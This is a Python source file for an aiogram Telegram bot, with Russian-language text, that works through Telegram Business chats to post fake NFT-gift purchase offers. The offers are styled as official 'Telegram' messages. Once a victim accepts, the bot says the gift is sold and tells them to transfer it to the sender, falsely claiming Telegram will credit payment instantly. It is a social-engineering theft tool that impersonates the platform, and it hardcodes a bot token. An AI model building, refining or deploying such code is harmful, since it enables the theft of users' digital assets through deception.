import asyncio
import logging
import os
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message, BusinessConnection, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = "8919998480:AAG2n5NPWx8mcRZOPxcZ3fZn9CvXUG44TFk"

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Глобальная переменная для хранения ID кастомного эмодзи TON
TON_EMOJI_ID = None

# Словарь для хранения данных о сделках
active_deals = {}

@dp.startup()
async def on_startup():
    global TON_EMOJI_ID
    try:
        sticker_set = await bot.get_sticker_set(name="xRocketIcons")
        if len(sticker_set.stickers) >= 116:
            TON_EMOJI_ID = sticker_set.stickers[115].custom_emoji_id
            logging.info(f"Успешно загружен кастомный эмодзи ID по умолчанию: {TON_EMOJI_ID}")
    except Exception as e:
        logging.error(f"Не удалось загрузить стикерпак xRocketIcons: {e}")

# Перехват кастомного эмодзи, отправленного боту
@dp.message(F.entities)
async def capture_custom_emoji(message: Message):
    global TON_EMOJI_ID
    if message.entities:
        for entity in message.entities:
            if entity.type == "custom_emoji":
                TON_EMOJI_ID = entity.custom_emoji_id
                emoji_preview = f'<tg-emoji emoji-id="{TON_EMOJI_ID}">💎</tg-emoji>'
                await message.reply(
                    f"✅ Валюта успешно изменена!\nНовый эмодзи: {emoji_preview}\nID: <code>{TON_EMOJI_ID}</code>", 
                    parse_mode="HTML"
                )
                return

@dp.business_connection()
async def on_business_connection(connection: BusinessConnection):
    if connection.is_enabled:
        try:
            await bot.send_message(
                chat_id=connection.user.id,
                text="🤖 **Бот успешно подключен** к Telegram Business и готов к управлению чатами!",
                parse_mode="Markdown"
            )
        except Exception as e:
            logging.error(f"Не удалось отправить уведомление пользователю: {e}")

@dp.message(Command("start"))
async def cmd_start(message: Message):
    emoji_status = f'<tg-emoji emoji-id="{TON_EMOJI_ID}">💎</tg-emoji>' if TON_EMOJI_ID else "💎 (стандартный)"
    
    text = (
        "👋 **Привет! Это бот для управления офферами по NFT/подаркам.**\n\n"
        f"Текущий эмодзи для TON: {emoji_status}\n\n"
        "• Команда /cf — настроить отображение валюты.\n"
        "• Отправьте мне кастомный эмодзи в любое время, чтобы обновить его."
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🔄 Обновить из xRocketIcons", callback_data="reload_emoji")
        ]
    ])
    
    await message.answer(text, reply_markup=keyboard, parse_mode="HTML")

@dp.message(Command("cf"))
async def cmd_cf(message: Message):
    emoji_status = f'<tg-emoji emoji-id="{TON_EMOJI_ID}">💎</tg-emoji>' if TON_EMOJI_ID else "💎"
    text = (
        "💱 <b>Выбери, как будет отображаться валюта.</b>\n\n"
        f"Текущая валюта: {emoji_status}\n"
        "По стандарту стоит 💎.\n\n"
        "👇 <b>Скинь мне кастомный эмодзи</b> в ответ на это сообщение, который будет использоваться вместо алмаза!"
    )
    await message.answer(text, parse_mode="HTML")

@dp.callback_query(F.data == "reload_emoji")
async def process_reload_emoji(callback: CallbackQuery):
    global TON_EMOJI_ID
    try:
        sticker_set = await bot.get_sticker_set(name="xRocketIcons")
        if len(sticker_set.stickers) >= 116:
            TON_EMOJI_ID = sticker_set.stickers[115].custom_emoji_id
            await callback.answer("Эмодзи успешно перезагружен!", show_alert=True)
        else:
            await callback.answer("Не удалось найти нужный стикер в паке.", show_alert=True)
    except Exception as e:
        await callback.answer(f"Ошибка: {e}", show_alert=True)

def parse_nft_info(url: str):
    try:
        slug = url.strip("/").split("/")[-1]
        if "-" in slug:
            parts = slug.rsplit("-", 1)
            nft_title = f"{parts[0]}#{parts[1]}"
        else:
            nft_title = slug
        return slug, nft_title
    except Exception:
        return "gift", "TelegramGift"

@dp.business_message(F.text.startswith("/offer"))
async def handle_business_offer(message: Message):
    try:
        await message.delete()
    except Exception:
        pass

    args = message.text.split()
    if len(args) < 2:
        return
    
    nft_link = args[1]
    
    amount = "15.0"
    if "/ton" in args:
        try:
            ton_index = args.index("/ton")
            if len(args) > ton_index + 1:
                amount = args[ton_index + 1]
        except ValueError:
            pass

    _, nft_title = parse_nft_info(nft_link)
    emoji_tag = f'<tg-emoji emoji-id="{TON_EMOJI_ID}">💎</tg-emoji>' if TON_EMOJI_ID else "💎"
    
    # Динамически берем имя и юзернейм отправителя через бизнес-соединение
    user = message.from_user
    user_display_name = user.first_name if user and user.first_name else "User"
    user_username = user.username if user and user.username else None
    
    if user_username:
        user_link = f"https://t.me/{user_username}"
        user_display_handle = f"@{user_username}"
    else:
        user_link = f"tg://user?id={user.id}" if user else "https://t.me/"
        user_display_handle = user_display_name

    text = (
        "<b>Telegram</b>\n"
        f"<b>{nft_title}</b>\n\n"
        f"Пользователь <b>{user_display_name}</b> предлагает Вам {amount} {emoji_tag} за подарок."
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", url=nft_link)
        ],
        [
            InlineKeyboardButton(text="Отклонить", callback_data="reject"),
            InlineKeyboardButton(text="Принять", callback_data="accept")
        ]
    ])

    sent_message = await bot.send_message(
        chat_id=message.chat.id,
        text=text,
        reply_markup=keyboard,
        parse_mode="HTML",
        business_connection_id=message.business_connection_id
    )
    
    active_deals[sent_message.message_id] = {
        "nft_link": nft_link,
        "nft_title": nft_title,
        "amount": amount,
        "user_display_name": user_display_name,
        "user_link": user_link,
        "user_display_handle": user_display_handle
    }

@dp.callback_query(F.data == "accept")
async def process_accept(callback: CallbackQuery):
    msg_id = callback.message.message_id
    deal = active_deals.get(msg_id, {
        "nft_title": "TelegramGift", 
        "nft_link": "https://t.me/nft/", 
        "amount": "15.0", 
        "user_display_name": "User",
        "user_link": "https://t.me/",
        "user_display_handle": "@user"
    })

    nft_title = deal["nft_title"]
    amount = deal["amount"]
    user_display_name = deal["user_display_name"]
    user_link = deal["user_link"]
    emoji_tag = f'<tg-emoji emoji-id="{TON_EMOJI_ID}">💎</tg-emoji>' if TON_EMOJI_ID else "💎"

    new_text = (
        "<b>Telegram</b>\n"
        f"<b>{nft_title}</b>\n\n"
        f"Подарок: {nft_title} успешно продан!\n\n"
        f"Передайте подарок покупателю для зачисления {amount} {emoji_tag}."
    )

    new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", url=deal["nft_link"])
        ],
        [
            InlineKeyboardButton(text=f"Передать NFT {user_display_name}", url=user_link)
        ],
        [
            InlineKeyboardButton(text="Как передать", callback_data="how_to")
        ]
    ])

    await callback.message.edit_text(new_text, reply_markup=new_keyboard, parse_mode="HTML")
    await callback.answer("Сделка принята!")

@dp.callback_query(F.data == "how_to")
async def process_how_to(callback: CallbackQuery):
    msg_id = callback.message.message_id
    deal = active_deals.get(msg_id, {
        "nft_title": "TelegramGift", 
        "user_display_handle": "@user"
    })
    nft_title = deal.get("nft_title", "TelegramGift")
    user_display_handle = deal.get("user_display_handle", "@user")

    instruction_text = (
        "<b>Как передать подарок пользователю:</b>\n"
        f"<b>{user_display_handle}</b>\n\n"
        f"1. Передайте подарок пользователю: <b>{user_display_handle}</b>.\n"
        f"2. Нажмите «Передать NFT» и выберите <b>{nft_title}</b>.\n"
        "3. Подтвердите передачу подарка.\n\n"
        "Telegram зафиксирует транзакцию и моментально зачислит оплату на ваш баланс. Резерв действует 24 часа."
    )

    back_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Вернуться к передаче", callback_data="back_to_deal")
        ]
    ])

    await callback.message.edit_text(instruction_text, reply_markup=back_keyboard, parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "back_to_deal")
async def process_back(callback: CallbackQuery):
    msg_id = callback.message.message_id
    deal = active_deals.get(msg_id, {
        "nft_title": "TelegramGift", 
        "nft_link": "https://t.me/nft/", 
        "amount": "15.0", 
        "user_display_name": "User",
        "user_link": "https://t.me/"
    })
    
    nft_title = deal.get("nft_title", "TelegramGift")
    amount = deal.get("amount", "15.0")
    user_display_name = deal.get("user_display_name", "User")
    user_link = deal.get("user_link", "https://t.me/")
    emoji_tag = f'<tg-emoji emoji-id="{TON_EMOJI_ID}">💎</tg-emoji>' if TON_EMOJI_ID else "💎"

    new_text = (
        "<b>Telegram</b>\n"
        f"<b>{nft_title}</b>\n\n"
        f"Подарок: {nft_title} успешно продан!\n\n"
        f"Передайте подарок покупателю для зачисления {amount} {emoji_tag}."
    )

    new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", url=deal["nft_link"])
        ],
        [
            InlineKeyboardButton(text=f"Передать NFT {user_display_name}", url=user_link)
        ],
        [
            InlineKeyboardButton(text="Как передать", callback_data="how_to")
        ]
    ])

    await callback.message.edit_text(new_text, reply_markup=new_keyboard, parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "reject")
async def process_reject(callback: CallbackQuery):
    await callback.message.edit_text("❌ Предложение отклонено.")
    await callback.answer()

async def handle(request):
    return web.Response(text="Bot is working!")

async def web_server():
    app = web.Application()
    app.router.add_get("/", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await web_server()
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
